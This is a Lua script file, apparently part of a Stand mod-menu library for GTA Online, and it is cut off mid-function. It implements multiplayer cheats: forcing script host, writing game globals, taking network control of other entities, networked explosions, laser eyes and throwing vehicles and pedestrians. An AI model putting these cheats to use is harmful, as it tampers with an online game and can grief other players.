require ("lib.baibai1lib.playerlib")
require ("lib.baibai1lib.functions")

friends_in_this_session = {}
modders_in_this_session = {}

function pid_to_handle(pid)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, memory.alloc(13*8), 13)
    return memory.alloc(13*8)
end

local set = {alert = true}
wait = util.yield
new = {}

function newColor(R, G, B, A)
    return {r = R, g = G, b = B, a = A}
end

function new.colour(R, G, B, A)
    return {r = R / 255, g = G / 255, b = B / 255, a = A or 1}
end

local white = new.colour( 255, 255, 255 )
local darkBlue = new.colour( 132, 207, 255 )

Ini = {}

function Ini.save(fileName, obj)
	local file <close> = assert(io.open(fileName, "w"), "error loading file")
	local s = {}
	for section, tbl in pairs(obj) do
		assert(type(tbl) == "table", "expected field " .. section .. " to be a table, got " .. type(tbl))
		local l = {}
		table.insert(l, string.format("[%s]", section))
		for k, v in pairs(tbl) do table.insert(l, string.format("%s=%s", k, v)) end
		table.insert(s, table.concat(l, '\n') .. '\n')
	end
	file:write(table.concat(s, '\n'))
end

function Ini.load(fileName)
	assert(type(fileName) == "string", "fileName must be a string")
	local file <close> = assert(io.open(fileName, "r"), "error loading file: " .. fileName)
	local data = {}
	local section
	for line in io.lines(fileName) do
		local tempSection = string.match(line, '^%[([^%]]+)%]$')

		if tempSection ~= nil then
			section = tonumber(tempSection) and tonumber(tempSection) or tempSection
			data[section] = data[section] or {}
		end

		local param, value = string.match(line, '^([%w_]+)%s*=%s*(.+)$')
		if section ~= nil and param and value ~= nil then
			if value == "true" then
				value = true
			elseif value == "false" then
				value = false
			elseif tonumber(value) then
				value = tonumber(value)
			end
			data[section][tonumber(param) or param] = value
		end
	end
	return data
end

resource_dir = filesystem.scripts_dir() .. "/baibaiScript/"

if not filesystem.exists(resource_dir) then
	notification("resource directory not found. notification system will be less of a bruh",colors.red)
else
	util.register_file(resource_dir .. "baibailogo.ytd")
end

local JS_logo = directx.create_texture(filesystem.scripts_dir() .. "/baibaiScript/" ..'JS.png')

if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield(0)
        end
    end)
 end

if not SCRIPT_SILENT_START then
    util.create_thread(function()
        local js_size = 0.017

        local l = 1
        while l < 50 do
            directx.draw_texture(JS_logo, js_size, js_size, 0.5, 0.5, 0.5, (1 - l / 250) + 0.03, 0, {r = 1, g = 1, b = 1, a = l / 50})
            util.yield()
            l += 5 - math.abs(math.floor(l / 10))
        end

        l = 1
        while l < 50 do
            directx.draw_texture(JS_logo, js_size, js_size, 0.5, 0.5, 0.5 - l / 500, 0.83, 0, white)
            util.yield()
            l += 5 - math.abs(math.floor(l / 10))
        end

        AUDIO.PLAY_SOUND(-1, "signal_on", "DLC_GR_Ambushed_Sounds", 0, 0, white)

        for i = 1, 360 do
            directx.draw_texture(JS_logo, js_size, js_size, 0.5, 0.5, 0.4, 0.83, i / 360, white)
            if i < 150 then
                directx.draw_text(0.5, 0.81 + (i / 25000), '成就已解锁', ALIGN_TOP_CENTRE, 0.6, white, false)
            elseif i > 170 then
                directx.draw_text(0.5, 0.81 + ((i - 150) / 25000), '加载白白脚本', ALIGN_TOP_CENTRE, 0.6, white, false)
            end
            util.yield()
        end

        l = 50
        while l >= 0 do
            directx.draw_texture(JS_logo, js_size, js_size, 0.5, 0.5, 0.5 - l / 500, 0.83, 0, white)
            util.yield()
            l -= 6 - math.abs(math.floor(l / 10))
        end

        l = 50
        while l >= 0 do
            directx.draw_texture(JS_logo, js_size, js_size, 0.5, 0.5, 0.5, (1 - l / 250) + 0.03, 0, {r = 1, g = 1, b = 1, a = l / 50})
            util.yield()
            l -= 6 - math.abs(math.floor(l / 10))
        end
    end)
end


TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
TTPos = ENTITY.GET_ENTITY_COORDS(TTPed, true)

colors = {
    green = 184,
    red = 6,
    yellow = 190,
    black = 2,
    white = 1,
    gray = 3,
    pink = 201,
    purple = 49,
    blue = 9
  }

    function notification(message, color)
        HUD.THEFEED_SET_BACKGROUND_COLOR_FOR_NEXT_POST(color)
        local picture
        if not filesystem.exists(resource_dir) then
            picture = "CHAR_SOCIAL_CLUB"
        else
            picture = "baibailogo"
        end
        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 1)
        while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
            util.yield()
        end
        util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)
        if color == colors.blue or color == colors.red then
            subtitle = "~b~通知"
        elseif color == colors.black then
            subtitle = "~b~通知"
        else
            subtitle = "~b~通知"
        end
        HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, "bart", true, 4, "baibai", subtitle)
    
        HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
        util.log(message)
    end

function player_toggle_loop(root, pid, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
            if not players.exists(pid) then util.stop_thread() end
    callback()
    end)
end

function get_friend_count()
    native_invoker.begin_call();native_invoker.end_call("203F1CFD823B27A4");
    return native_invoker.get_return_value_int();
end
function get_frined_name(friendIndex)
    native_invoker.begin_call();native_invoker.push_arg_int(friendIndex);native_invoker.end_call("4164F227D052E293");return native_invoker.get_return_value_string();
end

function gen_fren_funcs(name)
	local balls = menu.list(frendlist,name, {"friend "..name}, "", function(); end)
	menu.divider(balls ,name)
	menu.action(balls,"加入战局", {"jf "..name}, "",function()
		menu.trigger_commands("join "..name)
	end)
	menu.action(balls,"观看玩家", {"sf "..name}, "",function()
		menu.trigger_commands("namespectate "..name)
	end)
	menu.action(balls,"邀请到战局", {"if "..name}, "",function()
		menu.trigger_commands("invite "..name)
	end)
	menu.action(balls,"打开玩家档案", {"pf "..name}, "",function()
		menu.trigger_commands("nameprofile "..name)
	end)
end

defaultHealth = ENTITY.GET_ENTITY_MAX_HEALTH(PLAYER.PLAYER_PED_ID())
moddedHealth = defaultHealth

function custom_health(toggle)
    UsingModHealth = toggle
    
    local localPed = PLAYER.PLAYER_PED_ID()
    if UsingModHealth then
        PED.SET_PED_MAX_HEALTH(localPed, moddedHealth)
        ENTITY.SET_ENTITY_HEALTH(localPed, moddedHealth)
    else
        PED.SET_PED_MAX_HEALTH(localPed, defaultHealth)
        menu.trigger_command(moddedHealthSlider, defaultHealth) -- just if you want the slider to go to default value when mod health is off
        if ENTITY.GET_ENTITY_HEALTH(localPed) > defaultHealth then
            ENTITY.SET_ENTITY_HEALTH(localPed, defaultHealth)
        end
    end
end

function setcustomhealth(value)
    moddedHealth = value
end

defaultArmour = PLAYER.GET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID())
moddedArmour = defaultArmour

function custom_armor(toggle)
    UsingModArmour = toggle
    
    if UsingModArmour then
        PLAYER.SET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID(), moddedArmour)
    else
        PLAYER.SET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID(), defaultArmour)
        menu.trigger_command(moddedArmourSlider, defaultArmour) -- just if you want the slider to go to default value when mod Armour is off
    end
end

function setcustomarmor(value)
    moddedArmour = value
end

function healthincover()
    if PED.IS_PED_IN_COVER(players.user_ped(), false) then
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MAX_PERCENT(players.user(), 1.0)
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user(), 15.0)
	else
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MAX_PERCENT(players.user(), 0.5)
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user(), 1.0)
	end
end

local function set_health_refill_limit_and_mult(limit, mult)
    PLAYER.SET_PLAYER_HEALTH_RECHARGE_MAX_PERCENT(PLAYER.PLAYER_ID(), limit)
    PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(PLAYER.PLAYER_ID(), mult)
end

local normal_refill_limit = 0.25
local normal_refill_mult = 1.0
local isCustomRefill_Normal
function standhealthon(toggle)
        isCustomRefill_Normal = toggle
        while isCustomRefill_Normal do
            set_health_refill_limit_and_mult(normal_refill_limit, normal_refill_mult)
            util.yield(300)
        end
        if not isCustomRefill_Normal then
            set_health_refill_limit_and_mult(0.25, 1.0)
        end
end

function standhpmode(value)
    normal_refill_limit = value * 0.01
end

function standhpmodetime(value)
    normal_refill_mult = value
end

local cover_refill_limit = 0.25
local cover_refill_mult = 1.0
local isCustomRefill_Cover
function hidehealthon(toggle)
    isCustomRefill_Cover = toggle
    
    while isCustomRefill_Cover do
        if PED.IS_PED_IN_COVER(PLAYER.PLAYER_PED_ID()) then
            set_health_refill_limit_and_mult(cover_refill_limit, cover_refill_mult)
        end
        util.yield(300)
    end

    if not isCustomRefill_Cover then
        set_health_refill_limit_and_mult(0.25, 1.0)
    end
end

function hidehpmode(value)
    cover_refill_limit = value * 0.01
end

function hidehpmodetime(value)
    cover_refill_mult = value
end

Colour = {}

function new.colour(R, G, B, A)
    return {r = R / 255, g = G / 255, b = B / 255, a = A or 1}
end
function new.hudSettings(X, Y, ALIGNMENT)
    return {xOffset = X, yOffset = Y, scale = 0.5, alignment = ALIGNMENT, textColour = new.colour( 255, 255, 255 )}
end
function new.delay(MS, S, MIN)
    return {ms = MS, s = S, min = MIN}
end

function firewingscale(value)
    fireWingsSettings.scale = value / 10
end

function firewingcolour(colour)
    fireWingsSettings.colour = colour
end

local mildOrangeFire = new.colour( 255, 127, 80 )

fireBreathSettings = {
    scale = 0.3,
    colour = mildOrangeFire,
    on = false,
    y = { value = 0.12, still = 0.12, walk =  0.22, sprint = 0.32, sneak = 0.35 },
    z = { value = 0.58, still = 0.58, walk =  0.45, sprint = 0.38, sneak = 0.35 },
}

local fireWings = {
    [1] = {pos = {[1] = 120, [2] =  75}},
    [2] = {pos = {[1] = 120, [2] = -75}},
    [3] = {pos = {[1] = 135, [2] =  75}},
    [4] = {pos = {[1] = 135, [2] = -75}},
    [5] = {pos = {[1] = 180, [2] =  75}},
    [6] = {pos = {[1] = 180, [2] = -75}},
    [7] = {pos = {[1] = 195, [2] =  75}},
    [8] = {pos = {[1] = 195, [2] = -75}},
}

fireWingsSettings = {
    scale = 0.3,
    colour = mildOrangeFire,
    on = false
}
local ptfxEgg
function firewing(toggle)
    fireWingsSettings.on = toggle
    if fireWingsSettings.on then
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
        if ptfxEgg == nil then
            local eggHash = 1803116220
            loadModel(eggHash)
            ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
            ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
        end
        for i = 1, #fireWings do
            while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                util.yield()
            end
            GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
            fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], fireWingsSettings.scale, false, false, false)

            util.create_tick_handler(function()
                local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                for i = 1, #fireWings do
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWings[i].ptfx, fireWingsSettings.scale)
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, fireWingsSettings.colour.r, fireWingsSettings.colour.g, fireWingsSettings.colour.b)
                end

                ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                return fireWingsSettings.on
            end)
        end
    else
        for i = 1, #fireWings do
            if fireWings[i].ptfx then
                GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                fireWings[i].ptfx = nil
            end
            if ptfxEgg then
                entities.delete_by_handle(ptfxEgg)
                ptfxEgg = nil
            end
        end
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
    end
end


local function transitionValue(value, target, step)
    if value == target then return value end
    return value + step * ( value > target and -1 or 1 )
end

function fireBreathSettings:changePos(movementType)
    self.z.value = transitionValue(self.z.value, self.z[movementType], 0.01)
    self.y.value = transitionValue(self.y.value, self.y[movementType], 0.01)
end

levitationCommand = menu.ref_by_path('Self>Movement>Levitation>Levitation', 38)

function firebreathxxx(toggle)
    fireBreathSettings.on = toggle
    if toggle then
        while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
            STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
            util.yield()
        end
        GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
        fireBreathSettings.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE('muz_xs_turret_flamethrower_looping', players.user_ped(), 0, 0.12, 0.58, 30, 0, 0, 0x8b93, fireBreathSettings.scale, false, false, false)
        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
    else
        GRAPHICS.REMOVE_PARTICLE_FX(fireBreathSettings.ptfx, true)
        fireBreathSettings.ptfx = nil
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
    end
    util.create_tick_handler(function()
        local user_ped = players.user_ped()
        if PED.GET_PED_PARACHUTE_STATE(user_ped) == 0 and ENTITY.IS_ENTITY_IN_AIR(user_ped) then
            GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, 0.81, 0, -10, 0, 0)
        elseif menu.get_value(levitationCommand) then
            GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, -0.12, 0.58, 150, 0, 0)
        else
            local movementType = 'still'
            if TASK.IS_PED_SPRINTING(user_ped) then
                movementType = 'sprint'
            elseif TASK.IS_PED_WALKING(user_ped) then
                movementType = 'walk'
            elseif PED.GET_PED_STEALTH_MOVEMENT(user_ped) then
                movementType = 'sneak'
            end

            fireBreathSettings:changePos(movementType)
            GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, fireBreathSettings.y.value, fireBreathSettings.z.value, 30, 0, 0)
        end
        return fireBreathSettings.on
    end)
end

function clumsy()
    if PED.IS_PED_RAGDOLL(players.user_ped()) then util.yield(3000) return end
        PED.SET_PED_RAGDOLL_ON_COLLISION(players.user_ped(), true)
end

function stumble()
    local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
    PED.SET_PED_TO_RAGDOLL_WITH_FALL(players.user_ped(), 1500, 2000, 2, vector.x, -vector.y, vector.z, 1, 0, 0, 0, 0, 0, 0)
end


function ragdoll_self()
    PED.SET_PED_TO_RAGDOLL(players.user_ped(), 2000, 2000, 0, true, true, true)
end

function scripthost_get()
    if players.get_script_host() ~= players.user() and get_transition_state(players.user()) ~= 0 then
        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))
    end
end

function firebreathscale(value)
    fireBreathSettings.scale = value / 10
    GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireBreathSettings.ptfx, fireBreathSettings.scale)
end

function firebreathcolour(colour)
    fireBreathSettings.colour = colour
    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
end

local is_player_pointing = function ()
	return read_global.int(4521801 + 930) == 3
end

local targetEntity = NULL
local lastStop <const> = newTimer()
local explosionProof = false
function godfinger()
    if is_player_pointing() then
		write_global.int(4521801 + 935, NETWORK.GET_NETWORK_TIME())
		if not ENTITY.DOES_ENTITY_EXIST(targetEntity) then
			local flag = TraceFlag.peds | TraceFlag.vehicles | TraceFlag.pedsSimpleCollision | TraceFlag.objects
			local raycastResult = get_raycast_result(500.0, flag)

			if raycastResult.didHit and ENTITY.DOES_ENTITY_EXIST(raycastResult.hitEntity) then
				targetEntity = raycastResult.hitEntity
			end
		else
			local myPos = players.get_position(players.user())
			local entityPos = ENTITY.GET_ENTITY_COORDS(targetEntity, true)
			local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
			local distance = myPos:distance(entityPos)
			if distance > 30.0 then distance = 30.0
			elseif distance < 10.0 then distance = 10.0 end
			local targetPos = v3.new(camDir)
			targetPos:mul(distance)
			targetPos:add(myPos)
			local direction = v3.new(targetPos)
			direction:sub(entityPos)
			direction:normalise()

			if ENTITY.IS_ENTITY_A_PED(targetEntity) then
				direction:mul(5.0)
				local explosionPos = v3.new(entityPos)
				explosionPos:sub(direction)
				draw_bounding_box(targetEntity, false, {r = 255, g = 255, b = 255, a = 255})
				set_explosion_proof(players.user_ped(), true)
				explosionProof = true
				FIRE.ADD_EXPLOSION(explosionPos.x, explosionPos.y, explosionPos.z, 29, 25.0, false, true, 0.0, true)
			else
				local vel = v3.new(direction)
				local magnitude = entityPos:distance(targetPos)
				vel:mul(magnitude)
				draw_bounding_box(targetEntity, true, {r = 255, g = 255, b = 255, a = 80})
				request_control_once(targetEntity)
				ENTITY.SET_ENTITY_VELOCITY(targetEntity, vel.x, vel.y, vel.z)
			end
		end
	elseif targetEntity ~= NULL then
		lastStop.reset()
		targetEntity = NULL

	elseif explosionProof and lastStop.elapsed() > 500 then
		explosionProof = false
		set_explosion_proof(players.user_ped(), false)
    end
end
--轨迹
function removeFxs(effects)
	for _, effect in ipairs(effects) do
		GRAPHICS.STOP_PARTICLE_FX_LOOPED(effect, 0)
		GRAPHICS.REMOVE_PARTICLE_FX(effect, 0)
	end
end

local function getZoneName(pid)
    return util.get_label_text(ZONE.GET_NAME_OF_ZONE(v3.get(players.get_position(pid))))
end

local wasDead = false
local respawnPos
local respawnRot
function custom_respawn()
    if respawnPos == nil then return end
    local isDead = PLAYER.IS_PLAYER_DEAD(players.user())
    if wasDead and not isDead then
        while PLAYER.IS_PLAYER_DEAD(players.user()) do
            util.yield()
        end
        for i = 0, 30 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), respawnPos.x, respawnPos.y, respawnPos.z, false, false, false)
            ENTITY.SET_ENTITY_ROTATION(players.user_ped(), respawnRot.x, respawnRot.y, respawnRot.z, 2, true)
            util.yield()
        end
    end
    wasDead = isDead
end

function save_custom_respawn()
    respawnPos = players.get_position(players.user())
    respawnRot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
    menu.set_menu_name(custom_respawn_toggle, '自定义复活' ..': '.. getZoneName(players.user()))
    local pos = 'X: '.. respawnPos.x ..'\nY: '.. respawnPos.y ..'\nZ: '.. respawnPos.z
    menu.set_help_text(custom_respawn_toggle,  pos)
    menu.set_help_text(custom_respawn_location,  '当前位置' ..':\n'.. pos)
end


function getOffsetFromCam(dist)
    local pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
    local dir = v3.toDir(CAM.GET_FINAL_RENDERED_CAM_ROT(2))
    local offset = {
        x = pos.x + dir.x * dist,
        y = pos.y + dir.y * dist,
        z = pos.z + dir.z * dist
    }
    return offset
end

function Leyes(lazer, impact, camrot, weap)
    local reye, leye
        local CV = CAM.GET_GAMEPLAY_CAM_COORD()
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local he = MISC.GET_HEADING_FROM_VECTOR_2D(CV.x, CV.y)
        ENTITY.SET_ENTITY_HEADING(players.user_ped(), he)
        ENTITY.SET_ENTITY_ROTATION(players.user_ped(), rot.x, rot.y, rot.z, 0, true)
    if util.is_session_started() then
        reye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 0x6b52))
        leye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 0x62ac))
        else
        reye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 6468))
        leye = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 5956))
    end
            -- credits to jinxscript
            local inst = v3.new()
            local cama = {}
            v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
            local tmp = v3.toDir(inst)
            v3.set(inst, v3.get(tmp))
            v3.mul(inst, 1000)
            v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
            v3.add(inst, tmp)
            cama.x, cama.y, cama.z = v3.get(inst)
            if lazer.exp then
                if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(players.user_ped(), memory.addrof(impact)) then
                    FIRE.ADD_EXPLOSION(impact.x, impact.y, impact.z, 81, 5000, true, false, 0.0, false)
                end
            end
    Streamptfx('weap_xs_weapons')
    camrot.x += 90
    camrot.y += 180
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('bullet_tracer_xs_sr', reye.x, reye.y, reye.z, camrot.x, camrot.y,  camrot.z, 1, true)
    Streamptfx('weap_xs_weapons')
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('bullet_tracer_xs_sr', leye.x, leye.y, leye.z, camrot.x, camrot.y,  camrot.z, 1, true)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(reye.x, reye.y, reye.z, cama.x, cama.y,  cama.z , 200, 0, weap, players.user_ped(), true, false, 1000, players.user_ped())
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(leye.x, leye.y, leye.z, cama.x, cama.y,  cama.z, 200, 0, weap, players.user_ped(), true, false, 1000, players.user_ped())
end

function SFle() 
    local scaleform = require('lib.baibai1lib.lib.ScaleformLib')
    local sf = scaleform('instructional_buttons')
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
---@diagnostic disable-next-line: param-type-mismatch
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(51, 51, true), '激光眼')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

function SFlev() 
    local scaleform = require('lib.baibai1lib.lib.ScaleformLib')
    local sf = scaleform('instructional_buttons')
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
---@diagnostic disable-next-line: param-type-mismatch
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(51, 51, true), '激光眼')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

local lazereyes = false
local impact = v3.new()
local lazer = {exp = false, bull = 'WEAPON_TACTICALRIFLE'}

function laser_eyes(on)
    lazereyes = on
    local weap = util.joaat(lazer.bull)
    local camrot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    WEAPON.REQUEST_WEAPON_ASSET(weap)
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped())  then
        SFlev()
    else
        SFle()
    end
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) and PAD.IS_CONTROL_PRESSED(51, 51) then
        Leyes(lazer, impact, camrot, weap)
        ENTITY.SET_ENTITY_ROTATION(entities.get_user_vehicle_as_handle(), 0, 0, camrot.z, 2, true)
    elseif not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) and PAD.IS_CONTROL_PRESSED(51, 51) then
        Leyes(lazer, impact, camrot, weap)
    end
end

function lazer_gun_exp(on)
    lazer.exp = on
end

function lazer_gun_exp_change(bulsel)
    lazer.bull = Leyel[bulsel]
end

function get_closest_veh(coords)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, veh in pairs(entities.get_all_vehicles_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(veh))
        if this_dist < closest_dist  and ENTITY.GET_ENTITY_HEALTH(veh) > 0 then
            closest = veh
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end

function get_closest_ped_new(coords)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
        if this_dist < closest_dist and not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped)  and not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            closest = ped
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end

local function request_control_of_entity_once(ent)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
    end
end

local entity_held = 0
local are_hands_up = false
local ped_held = 0
function handthrowvehs()
    if PAD.IS_CONTROL_JUST_RELEASED(38, 38) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true)  then
        if entity_held == 0 then
            if not are_hands_up then 
                local closest = get_closest_veh(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                local veh = closest[1]
                if veh ~= nil then 
                    local dist = closest[2]
                    if dist <= 5 then 
                        request_anim_dict("missminuteman_1ig_2")
                        TASK.TASK_PLAY_ANIM(players.user_ped(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                        util.yield(500)
                        are_hands_up = true
                        ENTITY.SET_ENTITY_ALPHA(veh, 100)
                        ENTITY.SET_ENTITY_HEADING(veh, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        request_control_of_entity_once(veh)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(veh, players.user_ped(), 0, 0, 0, get_model_size(ENTITY.GET_ENTITY_MODEL(veh)).z / 2, 180, 180, -180, true, false, true, false, 0, true)
                        entity_held = veh
                    end 
                end
            else
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                are_hands_up = false
            end
        else
            if ENTITY.IS_ENTITY_A_VEHICLE(entity_held) then
                ENTITY.DETACH_ENTITY(entity_held)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(entity_held, 100.0)
                VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(entity_held, true, true)
                ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, players.user_ped(), false)
                request_anim_dict("melee@unarmed@streamed_core")
                TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                util.yield(500)
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                entity_held = 0
                are_hands_up = false
            end
            -- toss
        end
    end
end

function handthrowpeds()
    if PAD.IS_CONTROL_JUST_RELEASED(38, 38) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        if entity_held == 0 then
            if not are_hands_up then 
                local closest = get_closest_ped_new(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                if closest ~= nil then
                    local ped = closest[1]
                    if ped ~= nil then
                        local dist = closest[2]
                        if dist <= 5 then 
                            request_anim_dict("missminuteman_1ig_2")
                            TASK.TASK_PLAY_ANIM(players.user_ped(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                            util.yield(500)
                            are_hands_up = true
                            ENTITY.SET_ENTITY_ALPHA(ped, 100)
